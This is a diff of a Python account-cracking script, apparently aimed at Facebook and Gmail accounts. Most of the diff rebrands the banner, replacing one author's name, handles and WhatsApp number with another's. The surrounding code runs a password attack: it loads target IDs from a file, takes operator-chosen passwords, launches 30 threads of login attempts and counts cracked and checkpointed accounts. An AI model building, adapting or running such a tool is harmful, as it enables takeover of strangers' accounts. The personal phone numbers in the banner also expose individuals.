@@ -1,4 +1,4 @@
-#SPY(SAT SHAHIN YT)(SHAHI. ALAM)
+ #SPY(SAT SHAHIN YT)(SHAHI. ALAM)
 #WhatsApp : 01840762780
 #Github : Rdx337
 from os import path
@@ -65,20 +65,19 @@ for x in range(10000):
 
 #menu_apikey()
 os.system('clear')
-logo = ("""
-\033[1;91m    _____   ___   ______  _____________   ________
-\033[1;92m   /  _/ | / / | / / __ \/ ____/ ____/ | / /_  __/
-\033[1;93m   / //  |/ /  |/ / / / / /   / __/ /  |/ / / /   
-\033[1;94m _/ // /|  / /|  / /_/ / /___/ /___/ /|  / / /    
-\033[1;95m/___/_/ |_/_/ |_/\____/\____/_____/_/ |_/ /_/     \033[1;92m
+logo = ("""  _   __       _     _     _        __       
+  /\/\   __| | / _\ __ _| |__ | |__ (_)_ __  / _\_ __  
+ /    \ / _` | \ \ / _` | '_ \| '_ \| | '__| \ \| '__| 
+/ /\/\ \ (_| | _\ \ (_| | |_) | |_) | | |    _\ \ |    
+\/    \/\__,_| \__/\__,_|_.__/|_.__/|_|_|    \__/_|                                                           
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
- ┃ [\033[1;91m✓\033[1;92m] AUTHOR    \033[1;91m: \033[1;92mMUMIT ISLAM HIMU           ┃
+ ┃ [\033[1;91m✓\033[1;92m] AUTHOR    \033[1;91m: \033[1;92mSABBIR            ┃
  ┃ [\033[1;91m✓\033[1;92m] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
  ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
  ┃ [\033[1;91m✓\033[1;92m] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
- ┃ [\033[1;91m✓\033[1;92m] GITHUB    \033[1;91m: \033[1;92mMUMIT-404-CYBER            ┃
- ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mMumit Islam                ┃
- ┃ [\033[1;91m✓\033[1;92m] WHATSAPP  \033[1;91m: \033[1;92m+8801644777805             ┃
+ ┃ [\033[1;91m✓\033[1;92m] GITHUB    \033[1;91m: \033[1;92mRDX337           ┃
+ ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mMd SABBIR SR            ┃
+ ┃ [\033[1;91m✓\033[1;92m] WHATSAPP  \033[1;91m: \033[1;92m+8801840762780             ┃
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
 
 def linex():
@@ -116,10 +115,10 @@ def ckx():
 			sys.exit()
 def Spy():
 	clear()
-	print(f" [A]FILE CRACK START")
-	print(f" [B] BD RANDOM CRACK ")
-	print(f" [C] Gmail Crack")
-	print(f" [0] Exit")
+	print(f" [A] 🥭FILE CRACK START")
+	print(f" [B] 🥭BD RANDOM CRACK ")
+	print(f" [C]🥭 Gmail Crack")
+	print(f" [0] 🥭Exit")
 	me=input(f'\n [?] Choose : ')
 	if me in ["B", "0B"]:
 		bd()
@@ -127,7 +126,7 @@ def Spy():
 		gml()
 	if me in ["A", "0A","11","A","a"]:
 		clear()
-		file = input(f' [?] Put file path\033[1;37m: ')
+		file = input(f' [?]  PUT FILE PATH \033[1;37m: ')
 		try:
 			fo = open(file,'r').read().splitlines()
 		except FileNotFoundError:
@@ -135,11 +134,11 @@ def Spy():
 			exit()
 		os.system('clear')
 		print(logo)
-		print(f' [1] Method 1 \n [2] Method 2 \n [3] Method 3 \n [4] Method 4')
-		mthd=input(f'\n [?] Choose: ')
+		print(f' [1] METHOD 1 \n [2] METHOD2 \n [3] METHOD 3 \n [4] METHOD4')
+		mthd=input(f'\n [?] CHOOSE: ')
 		plist=[]
 		try:
-			ps_limit = int(input(f'\n [?] How many passwords do you want to add ? : '))
+			ps_limit = int(input(f'\n [?] HOW MANY PASSWORDS DO YOU  WANT TO ADD ? : '))
 		except:
 			ps_limit =1
 		os.system('clear')
@@ -148,7 +147,7 @@ def Spy():
 		for i in range(ps_limit):
 			plist.append(input(f' [?] Put password {i+1}: '))
 	 
-		cx=input(f'\n [?] Do you went show cp account? (y/n): ')
+		cx=input(f'\n [?] DO YOU WENT SHOW CP ACCOUNT ? (y/n): ')
 		if cx in ['n','N','no','NO','2']:
 			pcp.append(f'n')
 		else:
@@ -156,8 +155,8 @@ def Spy():
 		with tred(max_workers=30) as crack_submit:
 			clear()
 			total_ids = str(len(fo))
-			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;37mM{mthd}')
-			print(f"\033[1;37m Use flight mode for speed up\033[1;37m")
+			print(f' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;37mM{mthd}')
+			print(f"\033[1;37m USE FILIGHT MODE FOR SPEED UP \033[1;37m")
 			linex()
 			for user in fo:
 				ids,names = user.split(f'|')
@@ -174,7 +173,7 @@ def Spy():
 					crack_submit.submit(api1,ids,names,passlist)
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [INNOCENT-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [SABBIR-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
